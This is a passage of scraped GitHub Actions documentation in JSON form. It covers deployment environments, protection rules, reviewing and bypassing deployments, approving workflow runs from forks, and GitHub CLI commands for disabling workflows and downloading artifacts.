          "Optionally, request the status of an approval for a workflow run by sending aGETrequest to/repos/OWNER/REPOSITORY_ID/actions/runs/RUN_ID/approvals. For more information, seeREST API endpoints for workflow runs.",
          "Optionally, review the deployment on GitHub. For more information, seeReviewing deployments."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing custom deployment protection rules in the GitHub Marketplace"
      },
      {
        "type": "paragraph",
        "text": "You can publish your GitHub App to the GitHub Marketplace to allow developers to discover suitable protection rules and install it across their GitHub repositories. Or you can browse existing custom deployment protection rules to suit your needs. For more information, seeAbout GitHub Marketplace for appsandListing an app on GitHub Marketplace."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About environments"
      },
      {
        "type": "paragraph",
        "text": "Environments are used to describe a general deployment target likeproduction,staging, ordevelopment. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. For more information about viewing deployments to environments, seeViewing deployment history."
      },
      {
        "type": "paragraph",
        "text": "You can configure environments with protection rules and secrets. When a workflow job references an environment, the job won't start until all of the environment's protection rules pass. A job also cannot access secrets that are defined in an environment until all the deployment protection rules pass."
      },
      {
        "type": "paragraph",
        "text": "Optionally, you can bypass an environment's protection rules and force all pending jobs referencing the environment to proceed. For more information, seeReviewing deployments."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Users with GitHub Free plans can only configure environments for public repositories. If you convert a repository from public to private, any configured protection rules or environment secrets will be ignored, and you will not be able to configure any environments. If you convert your repository back to public, you will have access to any previously configured protection rules and environment secrets."
      },
      {
        "type": "paragraph",
        "text": "Organizations with GitHub Team and users with GitHub Pro can configure environments for private repositories. For more information, seeGitHub’s plans."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Deployment protection rules"
      },
      {
        "type": "paragraph",
        "text": "Deployment protection rules require specific conditions to pass before a job referencing the environment can proceed. You can use deployment protection rules to require a manual approval, delay a job, or restrict the environment to certain branches. You can also create and implement custom protection rules powered by GitHub Apps to use third-party systems to control deployments referencing environments configured on GitHub."
      },
      {
        "type": "paragraph",
        "text": "Third-party systems can be observability systems, change management systems, code quality systems, or other manual configurations that you use to assess readiness before deployments are safely rolled out to environments."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Any number of GitHub Apps-based deployment protection rules can be installed on a repository. However, a maximum of 6 deployment protection rules can be enabled on any environment at the same time."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Required reviewers"
      },
      {
        "type": "paragraph",
        "text": "Use required reviewers to require a specific person or team to approve workflow jobs that reference the environment. You can list up to six users or teams as reviewers. The reviewers must have at least read access to the repository. Only one of the required reviewers needs to approve the job for it to proceed."
      },
      {
        "type": "paragraph",
        "text": "You also have the option to prevent self-reviews for deployments to protected environments. If you enable this setting, users who initiate a deployment cannot approve the deployment job, even if they are a required reviewer. This ensures that deployments to protected environments are always reviewed by more than one person."
      },
      {
        "type": "paragraph",
        "text": "For more information on reviewing jobs that reference an environment with required reviewers, seeReviewing deployments."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you are on a GitHub Free, GitHub Pro, or GitHub Team plan, required reviewers are only available for public repositories."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Wait timer"
      },
      {
        "type": "paragraph",
        "text": "Use a wait timer to delay a job for a specific amount of time after the job is initially triggered. The time (in minutes) must be an integer between 1 and 43,200 (30 days). Wait time will not count towards your billable time."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you are on a GitHub Free, GitHub Pro, or GitHub Team plan, wait timers are only available for public repositories."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Deployment branches and tags"
      },
      {
        "type": "paragraph",
        "text": "Use deployment branches and tags to restrict which branches and tags can deploy to the environment. Below are the options for deployment branches and tags for an environment:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "No restriction:No restriction on which branch or tag can deploy to the environment.",
          "Protected branches only:Only branches with branch protection rules enabled can deploy to the environment. If no branch protection rules are defined for any branch in the repository, then all branches can deploy. For more information about branch protection rules, seeAbout protected branches.NoteDeployment workflow runs triggered by tags with the same name as a protected branch and forks with branches that match the protected branch name cannot deploy to the environment.",
          "Selected branches and tags:Only branches and tags that match your specified name patterns can deploy to the environment.If you specifyreleases/*as a deployment branch or tag rule, only a branch or tag whose name begins withreleases/can deploy to the environment. (Wildcard characters will not match/. To match branches or tags that begin withrelease/and contain an additional single slash, userelease/*/*.) If you addmainas a branch rule, a branch namedmaincan also deploy to the environment. For more information about syntax options for deployment branches, see theRubyFile.fnmatchdocumentation.NoteName patterns must be configured for branches or tags individually."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Deployment branches and tags are available for all public repositories. For users on GitHub Pro or GitHub Team plans, deployment branches and tags are also available for private repositories."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Allow administrators to bypass configured protection rules"
      },
      {
        "type": "paragraph",
        "text": "By default, administrators can bypass the protection rules and force deployments to specific environments. For more information, seeReviewing deployments."
      },
      {
        "type": "paragraph",
        "text": "Alternatively, you can configure environments to disallow bypassing the protection rules for all deployments to the environment."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Allowing administrators to bypass protection rules is only available for public repositories for users on GitHub Free, GitHub Pro, and GitHub Team plans."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Custom deployment protection rules"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Custom deployment protection rules are currently in public preview and subject to change."
      },
      {
        "type": "paragraph",
        "text": "You can enable your own custom protection rules to gate deployments with third-party services. For example, you can use services such as Datadog, Honeycomb, and ServiceNow to provide automated approvals for deployments to GitHub. For more information, seeCreating custom deployment protection rules."
      },
      {
        "type": "paragraph",
        "text": "Once custom deployment protection rules have been created and installed on a repository, you can enable the custom deployment protection rule for any environment in the repository. For more information about configuring and enabling custom deployment protection rules, seeConfiguring custom deployment protection rules."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Custom deployment protection rules are only available for public repositories for users on GitHub Free, GitHub Pro, and GitHub Team plans."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Environment secrets"
      },
      {
        "type": "paragraph",
        "text": "Secrets stored in an environment are only available to workflow jobs that reference the environment. If the environment requires approval, a job cannot access environment secrets until one of the required reviewers approves it. For more information about secrets, seeAbout secrets."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Workflows that run on self-hosted runners are not run in an isolated container, even if they use environments. Environment secrets should be treated with the same level of security as repository and organization secrets. For more information, seeSecurity hardening for GitHub Actions.",
          "If you are using GitHub Free, environment secrets are only available in public repositories. For access to environment secrets in private or internal repositories, you must use GitHub Pro, GitHub Team, or GitHub Enterprise. For more information on switching your plan, seeUpgrading your account's plan."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Environment variables"
      },
      {
        "type": "paragraph",
        "text": "Variables stored in an environment are only available to workflow jobs that reference the environment. These variables are only accessible using thevarscontext. For more information, seeStore information in variables."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Environment variables are available for all public repositories. For users on GitHub Pro or GitHub Team plans, environment variables are also available for private repositories."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating an environment"
      },
      {
        "type": "paragraph",
        "text": "To configure an environment in a personal account repository, you must be the repository owner. To configure an environment in an organization repository, you must haveadminaccess."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Creation of an environment in a private repository is available to organizations with GitHub Team and users with GitHub Pro.",
          "Some features for environments have no or limited availability for private repositories. If you are unable to access a feature described in the instructions below, please see the documentation linked in the related step for availability information."
        ]
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickEnvironments.",
          "ClickNew environment.",
          "Enter a name for the environment, then clickConfigure environment. Environment names are not case sensitive. An environment name may not exceed 255 characters and must be unique within the repository.",
          "Optionally, specify people or teams that must approve workflow jobs that use this environment. For more information, seeRequired reviewers.SelectRequired reviewers.Enter up to 6 people or teams. Only one of the required reviewers needs to approve the job for it to proceed.Optionally, to prevent users from approving workflows runs that they triggered, selectPrevent self-review.ClickSave protection rules.",
          "SelectRequired reviewers.",
          "Enter up to 6 people or teams. Only one of the required reviewers needs to approve the job for it to proceed.",
          "Optionally, to prevent users from approving workflows runs that they triggered, selectPrevent self-review.",
          "ClickSave protection rules.",
          "Optionally, specify the amount of time to wait before allowing workflow jobs that use this environment to proceed. For more information, seeWait timer.SelectWait timer.Enter the number of minutes to wait.ClickSave protection rules.",
          "SelectWait timer.",
          "Enter the number of minutes to wait.",
          "ClickSave protection rules.",
          "Optionally, disallow bypassing configured protection rules. For more information, seeAllow administrators to bypass configured protection rules.DeselectAllow administrators to bypass configured protection rules.ClickSave protection rules.",
          "DeselectAllow administrators to bypass configured protection rules.",
          "ClickSave protection rules.",
          "Optionally, enable any custom deployment protection rules that have been created with GitHub Apps. For more information, seeCustom deployment protection rules.Select the custom protection rule you want to enable.ClickSave protection rules.",
          "Select the custom protection rule you want to enable.",
          "ClickSave protection rules.",
          "Optionally, specify what branches and tags can deploy to this environment. For more information, seeDeployment branches and tags.Select the desired option in theDeployment branchesdropdown.If you choseSelected branches and tags, to add a new rule, clickAdd deployment branch or tag ruleIn the \"Ref type\" dropdown menu, depending on what rule you want to apply, clickBranchorTag.Enter the name pattern for the branch or tag that you want to allow.NoteName patterns must be configured for branches or tags individually.ClickAdd rule.",
          "Select the desired option in theDeployment branchesdropdown.",
          "If you choseSelected branches and tags, to add a new rule, clickAdd deployment branch or tag rule",
          "In the \"Ref type\" dropdown menu, depending on what rule you want to apply, clickBranchorTag.",
          "Enter the name pattern for the branch or tag that you want to allow.NoteName patterns must be configured for branches or tags individually.",
          "ClickAdd rule.",
          "Optionally, add environment secrets. These secrets are only available to workflow jobs that use the environment. Additionally, workflow jobs that use this environment can only access these secrets after any configured rules (for example, required reviewers) pass. For more information, seeEnvironment secrets.UnderEnvironment secrets, clickAdd Secret.Enter the secret name.Enter the secret value.ClickAdd secret.",
          "UnderEnvironment secrets, clickAdd Secret.",
          "Enter the secret name.",
          "Enter the secret value.",
          "ClickAdd secret.",
          "Optionally, add environment variables. These variables are only available to workflow jobs that use the environment, and are only accessible using thevarscontext. For more information, seeEnvironment variables.UnderEnvironment variables, clickAdd Variable.Enter the variable name.Enter the variable value.ClickAdd variable.",
          "UnderEnvironment variables, clickAdd Variable.",
          "Enter the variable name.",
          "Enter the variable value.",
          "ClickAdd variable."
        ]
      },
      {
        "type": "paragraph",
        "text": "You can also create and configure environments through the REST API. For more information, seeREST API endpoints for deployment environments,REST API endpoints for GitHub Actions Secrets,REST API endpoints for GitHub Actions variables, andREST API endpoints for deployment branch policies."
      },
      {
        "type": "paragraph",
        "text": "Running a workflow that references an environment that does not exist will create an environment with the referenced name. If the environment is created from running implicit page builds (for example, from a branch or folder source), the source branch will be added as a protection rule to the environment. Otherwise, the newly created environment will not have any protection rules or secrets configured. Anyone that can edit workflows in the repository can create environments via a workflow file, but only repository admins can configure the environment."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Deleting an environment"
      },
      {
        "type": "paragraph",
        "text": "To configure an environment in a personal account repository, you must be the repository owner. To configure an environment in an organization repository, you must haveadminaccess."
      },
      {
        "type": "paragraph",
        "text": "Deleting an environment will delete all secrets and protection rules associated with the environment. Any jobs currently waiting because of protection rules from the deleted environment will automatically fail."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickEnvironments.",
          "Next to the environment that you want to delete, click.",
          "ClickI understand, delete this environment."
        ]
      },
      {
        "type": "paragraph",
        "text": "You can also delete environments through the REST API. For more information, seeREST API endpoints for repositories."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "How environments relate to deployments"
      },
      {
        "type": "paragraph",
        "text": "When a workflow job that references an environment runs, it creates a deployment object with theenvironmentproperty set to the name of your environment. As the workflow progresses, it also creates deployment status objects with theenvironmentproperty set to the name of your environment, theenvironment_urlproperty set to the URL for environment (if specified in the workflow), and thestateproperty set to the status of the job."
      },
      {
        "type": "paragraph",
        "text": "You can access these objects through the REST API or GraphQL API. You can also subscribe to these webhook events. For more information, seeREST API endpoints for repositories,Objects(GraphQL API), orWebhook events and payloads."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Next steps"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions provides several features for managing your deployments. For more information, seeDeploying with GitHub Actions."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/reviewing-deployments",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About required reviews in workflows"
      },
      {
        "type": "paragraph",
        "text": "Jobs that reference an environment configured with required reviewers will wait for an approval before starting. While a job is awaiting approval, it has a status of \"Waiting\". If a job is not approved within 30 days, it will automatically fail."
      },
      {
        "type": "paragraph",
        "text": "For more information about environments and required approvals, seeManaging environments for deployment. For information about how to review deployments with the REST API, seeREST API endpoints for workflow runs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Approving or rejecting a job"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the workflow run that requires review. For more information about navigating to a workflow run, seeViewing workflow run history.",
          "If the run requires review, you will see a notification for the review request. On the notification, clickReview deployments.",
          "Select the job environment(s) to approve or reject. Optionally, leave a comment.",
          "Approve or reject:To approve the job, clickApprove and deploy. Once a job is approved (and any other deployment protection rules have passed), the job will proceed. At this point, the job can access any secrets stored in the environment.To reject the job, clickReject. If a job is rejected, the workflow will fail.",
          "To approve the job, clickApprove and deploy. Once a job is approved (and any other deployment protection rules have passed), the job will proceed. At this point, the job can access any secrets stored in the environment.",
          "To reject the job, clickReject. If a job is rejected, the workflow will fail."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If the targeted environment is configured to prevent self-approvals for deployments, you will not be able to approve a deployment from a workflow run you initiated. For more information, seeManaging environments for deployment."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Bypassing deployment protection rules"
      },
      {
        "type": "paragraph",
        "text": "If you have configured deployment protection rules that control whether software can be deployed to an environment, you can bypass these rules and force all pending jobs referencing the environment to proceed."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "You cannot bypass deployment protection rules if the environment has been configured to prevent admins from bypassing configured protection rules. For more information, seeManaging environments for deployment.",
          "You can only bypass deployment protection rules during workflow execution when a job referencing the environment is in a \"Pending\" state."
        ]
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the workflow run. For more information about navigating to a workflow run, seeViewing workflow run history.",
          "To the right ofDeployment protection rules, clickStart all waiting jobs.",
          "In the pop-up window, select the environments for which you want to bypass deployment protection rules.",
          "UnderLeave a comment, enter a description for bypassing the deployment protection rules.",
          "ClickI understand the consequences, start deploying."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/viewing-deployment-history",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About deployment history"
      },
      {
        "type": "paragraph",
        "text": "You can deliver deployments through GitHub Actions and environments or with the REST API and third party apps. For more information about using environments to deploy with GitHub Actions, seeManaging environments for deployment. For more information about deployments with the REST API, seeREST API endpoints for repositories."
      },
      {
        "type": "paragraph",
        "text": "On the deployments page of your repository, you can view the following aspects of your deployments."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Currently active deployments across various environments",
          "Deployments filtered by environment",
          "Your repository's full deployment history",
          "Associated commits that triggered the deployment",
          "Connected GitHub Actions workflow logs",
          "The deployment URL (if one exists)",
          "The source pull request and branch related to each deployment",
          "Deployment statuses. For more information about deployment statuses, seeREST API endpoints for deployments."
        ]
      },
      {
        "type": "paragraph",
        "text": "By default, the deployments page shows currently active deployments from select environments and a timeline of the latest deployments for all environments."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Viewing your repository's deployment history"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "In the right-hand sidebar of the home page of your repository, clickDeployments.",
          "Once you are on the \"Deployments\" page, you can view the following information about your deployment history.To view recent deployments for a specific environment, in the \"Environments\" section of the left sidebar, click an environment.To pin an environment to the top of the deployment history list, repository administrators can clickto the right of the environment. You can pin up to ten environments.To view the commit that triggered a deployment, in the deployment history list, click the commit message for the deployment you want to view.NoteDeployments from commits that originate from a fork outside of the repository will not show links to the source pull request and branch related to each deployment. For more information about forks, seeAbout forks.To view the URL for a deployment, to the right of the commit message in the deployment history list, click.To navigate to the workflow run logs associated with a deployment, to the right of the commit message in the deployment history list, click, then clickView logs.",
          "To view recent deployments for a specific environment, in the \"Environments\" section of the left sidebar, click an environment.",
          "To pin an environment to the top of the deployment history list, repository administrators can clickto the right of the environment. You can pin up to ten environments.",
          "To view the commit that triggered a deployment, in the deployment history list, click the commit message for the deployment you want to view.NoteDeployments from commits that originate from a fork outside of the repository will not show links to the source pull request and branch related to each deployment. For more information about forks, seeAbout forks.",
          "To view the URL for a deployment, to the right of the commit message in the deployment history list, click.",
          "To navigate to the workflow run logs associated with a deployment, to the right of the commit message in the deployment history list, click, then clickView logs.",
          "Optionally, to filter the deployment history list, create a filter.Click on theFilterbutton.ClickAdd a filter.Choose a qualifier you would like to filter the deployment history by.Depending on the qualifier you chose, fill out information in the \"Operator\" and \"Value\" columns.Optionally, clickAdd a filterto add another filter.ClickApply.",
          "Click on theFilterbutton.",
          "ClickAdd a filter.",
          "Choose a qualifier you would like to filter the deployment history by.",
          "Depending on the qualifier you chose, fill out information in the \"Operator\" and \"Value\" columns.",
          "Optionally, clickAdd a filterto add another filter.",
          "ClickApply."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/approving-workflow-runs-from-private-forks",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About workflow runs from private forks"
      },
      {
        "type": "paragraph",
        "text": "If you rely on using forks of your private repositories, you can configure policies that control how users can run workflows onpull_requestevents. Available to private repositories only, you can configure these policy settings for organizations or repositories. For more information, seeEnforcing policies for GitHub Actions in your enterprise."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Approving workflow runs on a pull request from a private fork"
      },
      {
        "type": "paragraph",
        "text": "Maintainers with write access to a repository can use the following procedure to review and run workflows on pull requests from contributors that require approval."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Under your repository name, clickPull requests.",
          "In the list of pull requests, click the pull request you'd like to review.",
          "On the pull request, clickFiles changed.",
          "Inspect the proposed changes in the pull request and ensure that you are comfortable running your workflows on the pull request branch. You should be especially alert to any proposed changes in the.github/workflows/directory that affect workflow files.",
          "If you are comfortable with running workflows on the pull request branch, return to theConversationtab, and under \"Workflow(s) awaiting approval\", clickApprove and run."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/approving-workflow-runs-from-public-forks",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About workflow runs from public forks"
      },
      {
        "type": "paragraph",
        "text": "Anyone can fork a public repository, and then submit a pull request that proposes changes to the repository's GitHub Actions workflows. Although workflows from forks do not have access to sensitive data such as secrets, they can be an annoyance for maintainers if they are modified for abusive purposes."
      },
      {
        "type": "paragraph",
        "text": "To help prevent this, workflows on pull requests to public repositories from some outside contributors will not run automatically, and might need to be approved first. Depending on the \"Approval for running fork pull request workflows from contributors\" setting, workflows on pull requests to public repositories will not run automatically and may need approval if:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The pull request iscreated bya user that requires approvals based on the selected policy.",
          "The pull request event istriggered bya user that requires approvals based on the selected policy."
        ]
      },
      {
        "type": "paragraph",
        "text": "By default, all first-time contributors require approval to run workflows."
      },
      {
        "type": "paragraph",
        "text": "Workflows triggered bypull_request_targetevents are run in the context of the base branch. Since the base branch is considered trusted, workflows triggered by these events will always run, regardless of approval settings. For more information about thepull_request_targetevent, seeEvents that trigger workflows."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "These workflow approval policies are intended to restrict the set of users that can execute workflows in GitHub Actions runners that could lead to unexpected resource and compute consumption when using GitHub-hosted runners. If you are using self-hosted runners, potentially malicious user-controlled workflow code will execute automatically if the user is allowed to bypass approval in the set approval policy or if the pull request is approved. You must consider the risk of executing this code in your infrastructure and should review and follow the self-hosted runner security recommendations regardless of the approval settings utilized. SeeSecurity hardening for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "You can configure workflow approval requirements for arepository,organization, orenterprise."
      },
      {
        "type": "paragraph",
        "text": "Workflow runs that have been awaiting approval for more than 30 days are automatically deleted."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Approving workflow runs on a pull request from a public fork"
      },
      {
        "type": "paragraph",
        "text": "Maintainers with write access to a repository can use the following procedure to review and run workflows on pull requests from contributors that require approval."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Under your repository name, clickPull requests.",
          "In the list of pull requests, click the pull request you'd like to review.",
          "On the pull request, clickFiles changed.",
          "Inspect the proposed changes in the pull request and ensure that you are comfortable running your workflows on the pull request branch. You should be especially alert to any proposed changes in the.github/workflows/directory that affect workflow files.",
          "If you are comfortable with running workflows on the pull request branch, return to theConversationtab, and under \"Workflow(s) awaiting approval\", clickApprove and run."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/canceling-a-workflow",
    "content": [
      {
        "type": "paragraph",
        "text": "Write access to the repository is required to perform these steps."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Canceling a workflow run"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "From the list of workflow runs, click the name of thequeuedorin progressrun that you want to cancel.",
          "In the upper-right corner of the workflow, clickCancel workflow."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Steps GitHub takes to cancel a workflow run"
      },
      {
        "type": "paragraph",
        "text": "When canceling workflow run, you may be running other software that uses resources that are related to the workflow run. To help you free up resources related to the workflow run, it may help to understand the steps GitHub performs to cancel a workflow run."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "To cancel the workflow run, the server re-evaluatesifconditions for all currently running jobs. If the condition evaluates totrue, the job will not get canceled. For example, the conditionif: always()would evaluate to true and the job continues to run. When there is no condition, that is the equivalent of the conditionif: success(), which only runs if the previous step finished successfully.",
          "For jobs that need to be canceled, the server sends a cancellation message to all the runner machines with jobs that need to be canceled.",
          "For jobs that continue to run, the server re-evaluatesifconditions for the unfinished steps. If the condition evaluates totrue, the step continues to run. You can use thecancelledexpression to apply a status check ofcancelled(). For more information seeEvaluate expressions in workflows and actions.",
          "For steps that need to be canceled, the runner machine sendsSIGINT/Ctrl-Cto the step's entry process (nodefor javascript action,dockerfor container action, andbash/cmd/pwdwhen usingrunin a step). If the process doesn't exit within 7500 ms, the runner will sendSIGTERM/Ctrl-Breakto the process, then wait for 2500 ms for the process to exit. If the process is still running, the runner kills the process tree.",
          "After the 5 minutes cancellation timeout period, the server will force terminate all jobs and steps that don't finish running or fail to complete the cancellation process."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/deleting-a-workflow-run",
    "content": [
      {
        "type": "paragraph",
        "text": "Write access to the repository is required to perform these steps."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "To delete a workflow run, select, then clickDelete workflow run.",
          "Review the confirmation prompt and clickYes, permanently delete this workflow run."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/disabling-and-enabling-a-workflow",
    "content": [
      {
        "type": "paragraph",
        "text": "Disabling a workflow allows you to stop a workflow from being triggered without having to delete the file from the repo. You can easily re-enable the workflow again on GitHub."
      },
      {
        "type": "paragraph",
        "text": "Temporarily disabling a workflow can be useful in many scenarios. These are a few examples where disabling a workflow might be helpful:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A workflow error that produces too many or wrong requests, impacting external services negatively.",
          "A workflow that is not critical and is consuming too many minutes on your account.",
          "A workflow that sends requests to a service that is down.",
          "Workflows on a forked repository that aren't needed (for example, scheduled workflows)."
        ]
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "To prevent unnecessary workflow runs, scheduled workflows may be disabled automatically. When a public repository is forked, scheduled workflows are disabled by default. In a public repository, scheduled workflows are automatically disabled when no repository activity has occurred in 60 days."
      },
      {
        "type": "paragraph",
        "text": "You can also disable and enable a workflow using the REST API. For more information, seeREST API endpoints for workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Disabling a workflow"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to disable.",
          "Clickto display a dropdown menu and clickDisable workflow."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To learn more about GitHub CLI, seeAbout GitHub CLI."
      },
      {
        "type": "paragraph",
        "text": "To disable a workflow, use theworkflow disablesubcommand. Replaceworkflowwith either the name, ID, or file name of the workflow you want to disable. For example,\"Link Checker\",1234567, or\"link-check-test.yml\". If you don't specify a workflow, GitHub CLI returns an interactive menu for you to choose a workflow."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh workflow disable WORKFLOW"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Enabling a workflow"
      },
      {
        "type": "paragraph",
        "text": "You can re-enable a workflow that was previously disabled."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to enable.",
          "ClickEnable workflow."
        ]
      },
      {
        "type": "paragraph",
        "text": "To enable a workflow, use theworkflow enablesubcommand. Replaceworkflowwith either the name, ID, or file name of the workflow you want to enable. For example,\"Link Checker\",1234567, or\"link-check-test.yml\". If you don't specify a workflow, GitHub CLI returns an interactive menu for you to choose a workflow."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh workflow enable WORKFLOW"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts",
    "content": [
      {
        "type": "paragraph",
        "text": "By default, GitHub stores build logs and artifacts for 90 days, and you can customize this retention period, depending on the type of repository. For more information, seeManaging GitHub Actions settings for a repository."
      },
      {
        "type": "paragraph",
        "text": "Read access to the repository is required to perform these steps."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "From the list of workflow runs, click the name of the run to see the workflow run summary.",
          "In the \"Artifacts\" section, click the artifact you want to download."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To learn more about GitHub CLI, seeAbout GitHub CLI."
      },
      {
        "type": "paragraph",
        "text": "GitHub CLI will download each artifact into separate directories based on the artifact name. If only a single artifact is specified, it will be extracted into the current directory."
      },
      {
        "type": "paragraph",
        "text": "To download all artifacts generated by a workflow run, use therun downloadsubcommand. Replacerun-idwith the ID of the run that you want to download artifacts from. If you don't specify arun-id, GitHub CLI returns an interactive menu for you to choose a recent run."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run download RUN_ID"
      },
      {
        "type": "paragraph",
        "text": "To download a specific artifact from a run, use therun downloadsubcommand. Replacerun-idwith the ID of the run that you want to download artifacts from. Replaceartifact-namewith the name of the artifact that you want to download."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run download RUN_ID -n ARTIFACT_NAME"
      },
      {
        "type": "paragraph",
        "text": "You can specify more than one artifact."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run download RUN_ID> -n ARTIFACT_NAME-1 -n ARTIFACT_NAME-2"
      },
      {
        "type": "paragraph",
        "text": "To download specific artifacts across all runs in a repository, use therun downloadsubcommand."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run download -n ARTIFACT_NAME-1 ARTIFACT_NAME-2"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/manually-running-a-workflow",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Configuring a workflow to run manually"
      },
      {
        "type": "paragraph",
        "text": "To run a workflow manually, the workflow must be configured to run on theworkflow_dispatchevent."
      },
      {
        "type": "paragraph",
